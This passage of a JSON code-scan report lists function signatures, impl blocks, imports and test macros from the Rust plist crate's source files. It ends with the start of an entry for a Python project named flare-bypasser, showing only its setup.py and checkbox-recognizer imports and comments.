          "fn write_boolean(&mut self, value: bool) -> Result<(), Error> {",
          "fn write_data(&mut self, value: Cow<[u8]>) -> Result<(), Error> {",
          "fn write_date(&mut self, value: Date) -> Result<(), Error> {",
          "fn write_integer(&mut self, value: Integer) -> Result<(), Error> {",
          "fn write_real(&mut self, value: f64) -> Result<(), Error> {",
          "fn write_string(&mut self, value: Cow<str>) -> Result<(), Error> {",
          "fn write_uid(&mut self, value: Uid) -> Result<(), Error> {",
          "fn value_accessors() {",
          "fn builder() {",
          "fn builder_fails_if_all_events_have_not_been_read() {"
        ],
        "struct_defs": [
          "struct ValueVisitor;"
        ],
        "impl_blocks": [
          "impl Value {",
          "impl ser::Serialize for Value {",
          "impl From<Vec<Value>> for Value {",
          "impl From<Dictionary> for Value {",
          "impl From<bool> for Value {",
          "impl From<Date> for Value {",
          "impl From<f64> for Value {",
          "impl From<f32> for Value {",
          "impl From<i64> for Value {",
          "impl From<i32> for Value {",
          "impl From<i16> for Value {",
          "impl From<i8> for Value {",
          "impl From<u64> for Value {",
          "impl From<u32> for Value {",
          "impl From<u16> for Value {",
          "impl From<u8> for Value {",
          "impl From<String> for Value {",
          "impl Builder {",
          "impl Writer for Builder {",
          "impl private::Sealed for Builder {}"
        ],
        "uses": [
          "use std::{",
          "use crate::{",
          "use serde::{",
          "use crate::{",
          "use std::time::SystemTime;",
          "use super::*;",
          "use crate::{stream::Event::*, Date};"
        ],
        "macros": [
          "assert_eq!(array.as_array(), Some(&vec.clone()));",
          "assert_eq!(array.as_array_mut(), Some(&mut vec.clone()));",
          "assert_eq!(dict.as_dictionary(), Some(&map.clone()));",
          "assert_eq!(dict.as_dictionary_mut(), Some(&mut map.clone()));",
          "assert_eq!(Value::Boolean(true).as_boolean(), Some(true));",
          "assert_eq!(Value::Data(slice.to_vec()).as_data(), Some(slice));",
          "assert_eq!(",
          "assert_eq!(Value::Date(date).as_date(), Some(date));",
          "assert_eq!(Value::Real(0.0).as_real(), Some(0.0));",
          "assert_eq!(Value::Integer(1.into()).as_signed_integer(), Some(1));",
          "assert_eq!(Value::Integer(1.into()).as_unsigned_integer(), Some(1));",
          "assert_eq!(Value::Integer((-1).into()).as_unsigned_integer(), None);",
          "assert_eq!(",
          "assert_eq!(Value::String(\"2\".to_owned()).as_string(), Some(\"2\"));",
          "assert_eq!(",
          "assert_eq!(value.unwrap(), Value::Dictionary(dict));",
          "assert!(value.is_err());"
        ],
        "derives": [
          "#[derive(Clone, Debug, PartialEq)]",
          "#[derive(Default)]"
        ],
        "error_handling": 40
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/plist-1.8.0/src/serde_tests.rs",
        "function_defs": [
          "fn write_start_array(&mut self, len: Option<u64>) -> Result<(), Error> {",
          "fn write_start_dictionary(&mut self, len: Option<u64>) -> Result<(), Error> {",
          "fn write_end_collection(&mut self) -> Result<(), Error> {",
          "fn write_boolean(&mut self, value: bool) -> Result<(), Error> {",
          "fn write_data(&mut self, value: Cow<[u8]>) -> Result<(), Error> {",
          "fn write_date(&mut self, value: Date) -> Result<(), Error> {",
          "fn write_integer(&mut self, value: Integer) -> Result<(), Error> {",
          "fn write_real(&mut self, value: f64) -> Result<(), Error> {",
          "fn write_string(&mut self, value: Cow<str>) -> Result<(), Error> {",
          "fn write_uid(&mut self, value: Uid) -> Result<(), Error> {",
          "fn new_serializer() -> Serializer<VecWriter> {",
          "fn new_deserializer(events: Vec<Event>) -> Deserializer<Vec<Result<Event, Error>>> {",
          "fn assert_roundtrip<T>(obj: T, expected_events: &[Event], roundtrip_value: bool)",
          "fn cow() {",
          "fn dog() {",
          "fn frog() {",
          "fn cat_with_firmware() {",
          "fn cat_without_firmware() {",
          "fn newtype_struct() {",
          "fn type_with_options() {",
          "fn type_with_date() {",
          "fn option_some() {",
          "fn option_none() {",
          "fn option_some_some() {",
          "fn option_some_none() {",
          "fn option_dictionary_values() {",
          "fn option_dictionary_keys() {",
          "fn option_array() {",
          "fn enum_variant_types() {",
          "fn deserialise_old_enum_unit_variant_encoding() {",
          "fn deserialize_dictionary_xml() {",
          "fn deserialize_dictionary_binary() {",
          "fn check_common_plist(dict: &Dictionary) {",
          "fn deserialize_dictionary_binary_nskeyedarchiver() {",
          "fn try_parse_xml(bom: bool, whitespace: bool, decl: bool, comment: bool, doctype: bool) -> bool {",
          "fn xml_detection() {",
          "fn dictionary_deserialize_dictionary_in_struct() {",
          "fn dictionary_serialize_xml() {",
          "fn empty_array_and_dictionary_serialize_to_xml() {",
          "fn serde_yaml_to_value() {",
          "fn serialize_to_from_value() {",
          "fn deserialize_with_trailing_events_fails() {"
        ],
        "struct_defs": [
          "struct VecWriter {",
          "struct DogOuter {",
          "struct DogInner {",
          "struct NewtypeStruct(NewtypeInner);",
          "struct NewtypeInner(u8, u8, u8);",
          "struct TypeWithOptions {",
          "struct TypeWithDate {",
          "struct LayerinfoData {",
          "struct LayerinfoData {",
          "struct Empty {"
        ],
        "impl_blocks": [
          "impl VecWriter {",
          "impl Writer for VecWriter {",
          "impl Sealed for VecWriter {}"
        ],
        "uses": [
          "use serde::{",
          "use std::{borrow::Cow, collections::BTreeMap, fmt::Debug, fs::File, io::Cursor};",
          "use crate::{"
        ],
        "macros": [
          "assert_eq!(&events[..], expected_events);",
          "assert_eq!(value, expected_value);",
          "assert_eq!(obj_events_roundtrip, obj);",
          "assert_eq!(obj_value_roundtrip, obj);",
          "assert_eq!(obj, Foo::Baz);",
          "assert_eq!(",
          "assert_eq!(lines.len(), 2);",
          "assert_eq!(",
          "assert_eq!(",
          "assert!(dict.get(\"IsTrue\").unwrap().as_boolean().unwrap());",
          "assert!(!dict.get(\"IsNotFalse\").unwrap().as_boolean().unwrap());",
          "assert_eq!(data.len(), 15);",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(dict.get(\"Height\").unwrap().as_real().unwrap(), 1.6);",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(dict.get(\"Blank\").unwrap().as_string().unwrap(), \"\");",
          "assert_eq!(",
          "assert_eq!(objects.len(), 5);",
          "assert_eq!(objects[0].as_string().unwrap(), \"$null\");",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(objects_2_nsdata.len(), 103);",
          "assert_eq!(objects_2_nsdata[0], 0x03);",
          "assert_eq!(objects_2_nsdata[102], 0x01);",
          "assert_eq!(objects_3_classes.len(), 3);",
          "assert_eq!(objects_3_classes[0].as_string().unwrap(), \"NSMutableData\");",
          "assert_eq!(objects_3_classes[1].as_string().unwrap(), \"NSData\");",
          "assert_eq!(objects_3_classes[2].as_string().unwrap(), \"NSObject\");",
          "assert_eq!(",
          "assert_eq!(objects_4_classes.len(), 3);",
          "assert_eq!(",
          "assert_eq!(objects_4_classes[1].as_string().unwrap(), \"NSIndexSet\");",
          "assert_eq!(objects_4_classes[2].as_string().unwrap(), \"NSObject\");",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(version, 100000);",
          "assert!(",
          "assert_eq!(lib_dict.color.unwrap(), \"1,0.75,0,0.7\");",
          "assert_eq!(",
          "assert_eq!(xml, comparison);",
          "assert_eq!(xml, comparison);",
          "assert_eq!(value, Value::Boolean(true));",
          "assert_eq!(",
          "assert_eq!(dog_roundtrip, dog);",
          "assert!(value.is_err());"
        ],
        "derives": [
          "#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]",
          "#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]",
          "#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]",
          "#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]",
          "#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]",
          "#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]",
          "#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]",
          "#[derive(Debug, Deserialize, Eq, PartialEq, Serialize)]",
          "#[derive(Debug, Deserialize, Eq, PartialEq, Serialize)]",
          "#[derive(Deserialize)]",
          "#[derive(Deserialize)]",
          "#[derive(Serialize, Default)]"
        ],
        "error_handling": 80
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/plist-1.8.0/src/dictionary.rs",
        "function_defs": [
          "fn index(&self, index: &str) -> &Value {",
          "fn index_mut(&mut self, index: &str) -> &mut Value {",
          "fn fmt(&self, formatter: &mut fmt::Formatter) -> Result<(), fmt::Error> {",
          "fn from_iter<I: IntoIterator<Item = (K, V)>>(iter: I) -> Self {",
          "fn extend<T>(&mut self, iter: T)",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn len(&self) -> usize {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_unit<E>(self) -> Result<Self::Value, E>",
          "fn visit_map<V>(self, mut visitor: V) -> Result<Self::Value, V::Error>",
          "fn from_hash_map_to_dict() {"
        ],
        "struct_defs": [
          "struct Visitor;"
        ],
        "impl_blocks": [
          "impl Dictionary {",
          "impl ops::Index<&str> for Dictionary {",
          "impl ops::IndexMut<&str> for Dictionary {",
          "impl Debug for Dictionary {",
          "impl Extend<(String, Value)> for Dictionary {",
          "impl $($generics)* Iterator for $name $($generics)* {",
          "impl $($generics)* ExactSizeIterator for $name $($generics)* {",
          "impl IntoIterator for Dictionary {",
          "impl ser::Serialize for Dictionary {"
        ],
        "uses": [
          "use indexmap::{map, IndexMap};",
          "use std::{",
          "use crate::Value;",
          "use serde::{de, ser};",
          "use std::fmt;",
          "use crate::Dictionary;",
          "use serde::ser::SerializeMap;",
          "use super::Dictionary;"
        ],
        "macros": [
          "/// assert_eq!(dict.entry(\"serde\").key(), &\"serde\");",
          "/// assert_eq!(dict[\"serde\"], 12.into());",
          "/// assert_eq!(dict[\"serde\"], \"hoho\".into());",
          "///     Entry::Vacant(vacant) => assert_eq!(vacant.key(), &\"serde\"),",
          "///     Entry::Occupied(_) => unimplemented!(),",
          "///     Entry::Occupied(_) => unimplemented!(),",
          "///     Entry::Occupied(occupied) => assert_eq!(occupied.key(), &\"serde\"),",
          "///     Entry::Vacant(_) => unimplemented!(),",
          "///     Entry::Occupied(occupied) => assert_eq!(occupied.get(), &Value::from(12)",
          "///     Entry::Vacant(_) => unimplemented!(),",
          "///     Entry::Vacant(_) => unimplemented!(),",
          "/// assert_eq!(dict[\"serde\"].as_array().unwrap().len(), 4);",
          "///     Entry::Vacant(_) => unimplemented!(),",
          "/// assert_eq!(dict[\"serde\"].as_array().unwrap().len(), 4);",
          "///         assert_eq!(occupied.insert(13.into()), 12.into());",
          "///         assert_eq!(occupied.get(), &Value::from(13));",
          "///     Entry::Vacant(_) => unimplemented!(),",
          "///     Entry::Occupied(occupied) => assert_eq!(occupied.remove(), 12.into()),",
          "///     Entry::Vacant(_) => unimplemented!(),",
          "delegate_iterator!((Iter<'a>) => (&'a String, &'a Value));",
          "delegate_iterator!((IterMut<'a>) => (&'a String, &'a mut Value));",
          "delegate_iterator!((IntoIter) => (String, Value));",
          "delegate_iterator!((Keys<'a>) => &'a String);",
          "delegate_iterator!((Values<'a>) => &'a Value);",
          "delegate_iterator!((ValuesMut<'a>) => &'a mut Value);",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!("
        ],
        "derives": [
          "#[derive(Clone, Default, PartialEq)]"
        ],
        "error_handling": 21
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/plist-1.8.0/src/integer.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn from(value: i64) -> Integer {",
          "fn from(value: i32) -> Integer {",
          "fn from(value: i16) -> Integer {",
          "fn from(value: i8) -> Integer {",
          "fn from(value: u64) -> Integer {",
          "fn from(value: u32) -> Integer {",
          "fn from(value: u16) -> Integer {",
          "fn from(value: u8) -> Integer {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_i64<E>(self, v: i64) -> Result<Self::Value, E>",
          "fn visit_u64<E>(self, v: u64) -> Result<Self::Value, E>",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>",
          "fn from_str_limits() {"
        ],
        "struct_defs": [
          "struct IntegerVisitor;"
        ],
        "impl_blocks": [
          "impl Integer {",
          "impl fmt::Debug for Integer {",
          "impl fmt::Display for Integer {",
          "impl From<i64> for Integer {",
          "impl From<i32> for Integer {",
          "impl From<i16> for Integer {",
          "impl From<i8> for Integer {",
          "impl From<u64> for Integer {",
          "impl From<u32> for Integer {",
          "impl From<u16> for Integer {",
          "impl From<u8> for Integer {",
          "impl Serialize for Integer {",
          "impl Visitor<'_> for IntegerVisitor {"
        ],
        "uses": [
          "use std::{fmt, num::ParseIntError};",
          "use serde::{",
          "use std::fmt;",
          "use crate::Integer;",
          "use super::Integer;"
        ],
        "macros": [
          "unreachable!();",
          "assert_eq!(Integer::from_str(\"-1\"), Ok((-1).into()));",
          "assert_eq!(Integer::from_str(\"0\"), Ok(0.into()));",
          "assert_eq!(Integer::from_str(\"1\"), Ok(1.into()));",
          "assert_eq!(",
          "assert!(Integer::from_str(\"-9223372036854775809\").is_err());",
          "assert_eq!(",
          "assert!(Integer::from_str(\"18446744073709551616\").is_err());"
        ],
        "derives": [
          "#[derive(Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd)]"
        ],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/plist-1.8.0/src/stream/xml_writer.rs",
        "function_defs": [
          "fn write_element_and_value(&mut self, name: &str, value: &str) -> Result<(), Error> {",
          "fn start_element(&mut self, name: &str) -> Result<(), Error> {",
          "fn end_element(&mut self, name: &str) -> Result<(), Error> {",
          "fn write_event<F: FnOnce(&mut Self) -> Result<(), Error>>(",
          "fn write_value_event<F: FnOnce(&mut Self) -> Result<(), Error>>(",
          "fn handle_pending_collection(&mut self) -> Result<(), Error> {",
          "fn write_start_array(&mut self, _len: Option<u64>) -> Result<(), Error> {",
          "fn write_start_dictionary(&mut self, _len: Option<u64>) -> Result<(), Error> {",
          "fn write_end_collection(&mut self) -> Result<(), Error> {",
          "fn write_boolean(&mut self, value: bool) -> Result<(), Error> {",
          "fn write_data(&mut self, value: Cow<[u8]>) -> Result<(), Error> {",
          "fn write_date(&mut self, value: Date) -> Result<(), Error> {",
          "fn write_integer(&mut self, value: Integer) -> Result<(), Error> {",
          "fn write_real(&mut self, value: f64) -> Result<(), Error> {",
          "fn write_string(&mut self, value: Cow<str>) -> Result<(), Error> {",
          "fn write_uid(&mut self, _value: Uid) -> Result<(), Error> {",
          "fn from(err: XmlWriterError) -> Self {",
          "fn write_data_base64(",
          "fn streaming_parser() {",
          "fn custom_indent_string() {",
          "fn no_root() {",
          "fn events_to_xml<'event>("
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl From<XmlWriterError> for Error {"
        ],
        "uses": [
          "use base64::{engine::general_purpose::STANDARD as BASE64_STANDARD, Engine};",
          "use quick_xml::{",
          "use std::{",
          "use crate::{",
          "use std::io::Cursor;",
          "use super::*;",
          "use crate::stream::Event;"
        ],
        "macros": [
          "_ => unreachable!(),",
          "assert_eq!(actual, expected);",
          "assert_eq!(actual, expected);",
          "assert_eq!(actual, expected);"
        ],
        "derives": [
          "#[derive(PartialEq)]"
        ],
        "error_handling": 34
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/plist-1.8.0/src/stream/xml_reader.rs",
        "function_defs": [
          "fn from(err: XmlReaderError) -> Self {",
          "fn next(&mut self) -> Option<Result<OwnedEvent, Error>> {",
          "fn xml_reader_pos(&self) -> FilePosition {",
          "fn with_pos(&self, kind: ErrorKind) -> Error {",
          "fn read_xml_event<'buf>(&mut self, buffer: &'buf mut Vec<u8>) -> Result<XmlEvent<'buf>, Error> {",
          "fn read_content(&mut self, buffer: &mut Vec<u8>) -> Result<String, Error> {",
          "fn read_next(&mut self, buffer: &mut Vec<u8>) -> Result<ReadResult, Error> {",
          "fn streaming_parser() {",
          "fn bad_data() {",
          "fn entity_error() {"
        ],
        "struct_defs": [
          "struct ReaderState<R: BufRead>(EventReader<R>);"
        ],
        "impl_blocks": [
          "impl From<XmlReaderError> for ErrorKind {"
        ],
        "uses": [
          "use base64::{engine::general_purpose::STANDARD as base64_standard, Engine};",
          "use quick_xml::{escape::resolve_xml_entity, events::Event as XmlEvent, Error as XmlReaderError, Reader as EventReader};",
          "use std::io::{self, BufRead};",
          "use crate::{",
          "use std::{fs::File, io::BufReader};",
          "use super::*;",
          "use crate::stream::Event::*;"
        ],
        "macros": [
          "assert_eq!(events.unwrap(), comparison);",
          "assert!(events.last().unwrap().is_err());",
          "assert!(event.is_err());",
          "assert_eq!("
        ],
        "derives": [],
        "error_handling": 30
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/plist-1.8.0/src/stream/ascii_reader.rs",
        "function_defs": [
          "fn error(&self, kind: ErrorKind) -> Error {",
          "fn read_one(&mut self) -> Result<Option<u8>, Error> {",
          "fn advance(&mut self) -> Result<Option<u8>, Error> {",
          "fn unquoted_string_literal(&mut self, first: u8) -> Result<Option<OwnedEvent>, Error> {",
          "fn utf16_escape(&mut self) -> Result<String, Error> {",
          "fn utf16_code_unit(&mut self) -> Result<Option<u16>, Error> {",
          "fn advance_quoted_string(&mut self) -> Result<u8, Error> {",
          "fn quoted_string_literal(&mut self, quote: u8) -> Result<Option<OwnedEvent>, Error> {",
          "fn line_comment(&mut self) -> Result<(), Error> {",
          "fn block_comment(&mut self) -> Result<(), Error> {",
          "fn potential_comment(&mut self) -> Result<Option<OwnedEvent>, Error> {",
          "fn read_next(&mut self) -> Result<Option<OwnedEvent>, Error> {",
          "fn next(&mut self) -> Option<Result<OwnedEvent, Error>> {",
          "fn map_next_step_to_unicode(c: char) -> char {",
          "fn empty_test() {",
          "fn streaming_sample() {",
          "fn utf8_strings() {",
          "fn invalid_utf16_escapes() {",
          "fn invalid_octal_escapes() {",
          "fn escaped_sequences_in_strings() {",
          "fn integers_and_strings() {",
          "fn netnewswire_pbxproj() {",
          "fn multiple_unquoted_strings() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::{",
          "use std::io::Read;",
          "use std::fs::File;",
          "use super::*;",
          "use crate::stream::Event::*;"
        ],
        "macros": [
          "if matches!(code_unit, 0xD800..=0xDFFF) {",
          "|| !matches!(self.peeked_char, Some(b'u' | b'U'))",
          "assert_eq!(events, &[]);",
          "assert_eq!(events, comparison);",
          "assert_eq!(events, comparison);",
          "assert!(events[2].is_err());",
          "assert!(events[4].is_err());",
          "assert!(events[6].is_err());",
          "assert!(events[2].is_err());",
          "assert!(events[4].is_err());",
          "assert_eq!(events, comparison);",
          "assert_eq!(events, comparison);",
          "assert!(!events.is_empty());",
          "assert_eq!(events, comparison);"
        ],
        "derives": [],
        "error_handling": 48
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/plist-1.8.0/src/stream/binary_reader.rs",
        "function_defs": [
          "fn read_all(&mut self, buf: &mut [u8]) -> Result<(), Error> {",
          "fn seek(&mut self, pos: SeekFrom) -> Result<u64, Error> {",
          "fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {",
          "fn allocate_vec<T>(&self, len: u64, size: usize) -> Result<Vec<T>, Error> {",
          "fn read_trailer(&mut self) -> Result<(), Error> {",
          "fn read_ints(&mut self, len: u64, size: u8) -> Result<Vec<u64>, Error> {",
          "fn read_refs(&mut self, len: u64) -> Result<Vec<u64>, Error> {",
          "fn read_object_len(&mut self, len: u8) -> Result<u64, Error> {",
          "fn read_data(&mut self, len: u64) -> Result<Vec<u8>, Error> {",
          "fn seek_to_object(&mut self, object_ref: u64) -> Result<u64, Error> {",
          "fn push_stack_item_and_check_for_recursion(&mut self, item: StackItem) -> Result<(), Error> {",
          "fn pop_stack_item(&mut self) -> StackItem {",
          "fn read_next(&mut self) -> Result<Option<OwnedEvent>, Error> {",
          "fn read_u8(&mut self) -> Result<u8, Error> {",
          "fn read_be_u16(&mut self) -> Result<u16, Error> {",
          "fn read_be_u24(&mut self) -> Result<u32, Error> {",
          "fn read_be_u32(&mut self) -> Result<u32, Error> {",
          "fn read_be_u64(&mut self) -> Result<u64, Error> {",
          "fn read_be_i64(&mut self) -> Result<i64, Error> {",
          "fn read_be_i128(&mut self) -> Result<i128, Error> {",
          "fn with_pos(&self, kind: ErrorKind) -> Error {",
          "fn next(&mut self) -> Option<Result<OwnedEvent, Error>> {",
          "fn streaming_parser() {",
          "fn utf16_plist() {",
          "fn nskeyedarchiver_plist() {",
          "fn three_byte_integer_object_offset_plist() {"
        ],
        "struct_defs": [
          "struct StackItem {",
          "struct PosReader<R> {"
        ],
        "impl_blocks": [],
        "uses": [
          "use std::{",
          "use crate::{",
          "use std::fs::File;",
          "use super::*;",
          "use crate::stream::Event::*;"
        ],
        "macros": [
          "_ => unreachable!(\"size is either self.ref_size or offset_size both of which are",
          "assert_eq!(events, &comparison[..]);",
          "assert_eq!(events[2], Event::String(\"\\u{2605} or better\".into()));",
          "panic!(\"not a string\")",
          "assert_eq!(poem.len(), 643);",
          "assert_eq!(poem.to_mut().pop().unwrap(), '\\u{2605}');",
          "assert_eq!(events[10], Event::Uid(Uid::new(4)));",
          "assert_eq!(events[12], Event::Uid(Uid::new(2)));",
          "assert_eq!(events[18], Event::Uid(Uid::new(3)));",
          "assert_eq!(events[46], Event::Uid(Uid::new(1)));",
          "assert_eq!(events[0], Event::StartDictionary(Some(4)));",
          "assert_eq!(events[1], Event::String(\"data\".into()));",
          "assert_eq!(events[2], Event::StartDictionary(Some(2199)));",
          "assert_eq!(events[3], Event::String(\"1838\".into()));"
        ],
        "derives": [],
        "error_handling": 87
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/plist-1.8.0/src/stream/binary_writer.rs",
        "function_defs": [
          "fn write_start_collection(&mut self, ty: CollectionType) -> Result<(), Error> {",
          "fn write_end_collection(&mut self) -> Result<(), Error> {",
          "fn write_value(&mut self, value: Value) -> Result<(), Error> {",
          "fn expecting_dictionary_key(&self) -> bool {",
          "fn increment_current_collection_len(&mut self) {",
          "fn write_plist(&mut self) -> Result<(), Error> {",
          "fn write_plist_collection(",
          "fn write_plist_value(",
          "fn write_start_array(&mut self, _len: Option<u64>) -> Result<(), Error> {",
          "fn write_start_dictionary(&mut self, _len: Option<u64>) -> Result<(), Error> {",
          "fn write_end_collection(&mut self) -> Result<(), Error> {",
          "fn write_boolean(&mut self, value: bool) -> Result<(), Error> {",
          "fn write_data(&mut self, value: Cow<[u8]>) -> Result<(), Error> {",
          "fn write_date(&mut self, value: Date) -> Result<(), Error> {",
          "fn write_integer(&mut self, value: Integer) -> Result<(), Error> {",
          "fn write_real(&mut self, value: f64) -> Result<(), Error> {",
          "fn write_string(&mut self, value: Cow<str>) -> Result<(), Error> {",
          "fn write_uid(&mut self, value: Uid) -> Result<(), Error> {",
          "fn is_even(value: usize) -> bool {",
          "fn value_mut<'a>(",
          "fn write_plist_value_ty_and_size(",
          "fn plist_ref_size(max_value: usize) -> u8 {",
          "fn write_plist_ref(",
          "fn write_exact(&mut self, buf: &[u8]) -> Result<(), Error> {",
          "fn write(&mut self, buf: &[u8]) -> io::Result<usize> {",
          "fn flush(&mut self) -> io::Result<()> {",
          "fn zero() -> ObjectRef {",
          "fn clone_and_increment_self(&mut self) -> ObjectRef {",
          "fn value(&self) -> usize {",
          "fn into_owned(self) -> Value<'static> {",
          "fn event_kind(&self) -> EventKind {",
          "fn test_roundtrip<P: AsRef<Path>>(path: P) {",
          "fn bplist_roundtrip() {",
          "fn utf16_roundtrip() {",
          "fn nskeyedarchiver_roundtrip() {"
        ],
        "struct_defs": [
          "struct PosWriter<W: Write> {",
          "struct ObjectRef(NonZeroUsize);",
          "struct Collection {"
        ],
        "impl_blocks": [
          "impl ObjectRef {",
          "impl Value<'_> {"
        ],
        "uses": [
          "use indexmap::IndexMap;",
          "use std::{",
          "use crate::{",
          "use std::{fs::File, io::Cursor, path::Path};",
          "use crate::{stream::BinaryReader, Value};"
        ],
        "macros": [
          "unreachable!(\"items in `collection_stack` always point to a collection event\");",
          "unreachable!(\"items in `collection_stack` always point to a collection event\");",
          "unreachable!(\"items in `collection_stack` always point to a collection event\");",
          "assert!(self.collection_stack.is_empty());",
          "unreachable!(\"`events` starts with a value or collection event\")",
          "unreachable!(\"collection object refs are assigned before this function is called",
          "assert!(c.object_ref.is_none());",
          "Event::DictionaryKeys(_) => unreachable!(",
          "unreachable!(\"dictionary keys are assigned as values in `write_end_collection`\")",
          "unreachable!(\"value object refs are assigned before this function is called\");",
          "unreachable!(\"an integer can be represented as either an i64 or u64\");",
          "_ => unreachable!(\"`ref_size` is a power of two less than or equal to 8\"),",
          "assert_eq!(value_to_encode, value_decoded_from_encode);"
        ],
        "derives": [
          "#[derive(Clone)]",
          "#[derive(Eq, PartialEq)]",
          "#[derive(Eq, Hash, PartialEq)]"
        ],
        "error_handling": 56
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/plist-1.8.0/src/stream/mod.rs",
        "function_defs": [
          "fn default() -> Self {",
          "fn next(&mut self) -> Option<Event<'a>> {",
          "fn handle_value<'c, 'b: 'c>(",
          "fn init(&mut self, mut reader: R) -> Result<Option<OwnedEvent>, Error> {",
          "fn is_binary(reader: &mut R) -> Result<bool, Error> {",
          "fn next(&mut self) -> Option<Result<OwnedEvent, Error>> {",
          "fn from_io_offset_0(err: io::Error) -> Error {",
          "fn write(&mut self, event: Event) -> Result<(), Error> {",
          "fn write_start_array(&mut self, len: Option<u64>) -> Result<(), Error>;",
          "fn write_start_dictionary(&mut self, len: Option<u64>) -> Result<(), Error>;",
          "fn write_end_collection(&mut self) -> Result<(), Error>;",
          "fn write_boolean(&mut self, value: bool) -> Result<(), Error>;",
          "fn write_data(&mut self, value: Cow<[u8]>) -> Result<(), Error>;",
          "fn write_date(&mut self, value: Date) -> Result<(), Error>;",
          "fn write_integer(&mut self, value: Integer) -> Result<(), Error>;",
          "fn write_real(&mut self, value: f64) -> Result<(), Error>;",
          "fn write_string(&mut self, value: Cow<str>) -> Result<(), Error>;",
          "fn write_uid(&mut self, value: Uid) -> Result<(), Error>;",
          "fn autodetect_binary() {",
          "fn autodetect_xml() {",
          "fn autodetect_ascii() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl XmlWriteOptions {",
          "impl Default for XmlWriteOptions {"
        ],
        "uses": [
          "use std::{",
          "use crate::{",
          "use std::io::Write;",
          "use std::fs::File;",
          "use super::{Event::*, *};"
        ],
        "macros": [
          "assert!(",
          "assert!(",
          "assert!(matches!(streaming_parser.0, ReaderInner::Binary(_)));",
          "assert!(events.is_ok());",
          "assert!(matches!(streaming_parser.0, ReaderInner::Xml(_)));",
          "assert_eq!(events.unwrap(), ANIMALS_PLIST_EVENTS);",
          "assert!(matches!(streaming_parser.0, ReaderInner::Ascii(_)));",
          "assert_eq!(events.unwrap(), ANIMALS_PLIST_EVENTS);"
        ],
        "derives": [
          "#[derive(Clone, Debug, PartialEq)]",
          "#[derive(Clone, Debug)]"
        ],
        "error_handling": 17
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare-bypasser-0.1.52",
    "name": "flare-bypasser-0.1.52",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare-bypasser-0.1.52/setup.py",
        "docstrings": [],
        "function_defs": [
          "def is_installed(pkgname):"
        ],
        "class_defs": [],
        "imports": [
          "import sys",
          "import os",
          "import importlib",
          "import distutils.core"
        ],
        "comments": [
          "# Trick for avoid installation of non pip installed packages (apt), available by ADDITIONAL_PYTHONPATH",
          "# 'websockets @ git+https://github.com/yoori/websockets.git@main',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@debug3',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@flare-bypasser',",
          "# Server dependecies"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare-bypasser-0.1.52/utils/checkbox_recognizer.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import sys",
          "import logging",
          "import argparse",
          "import cv2",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
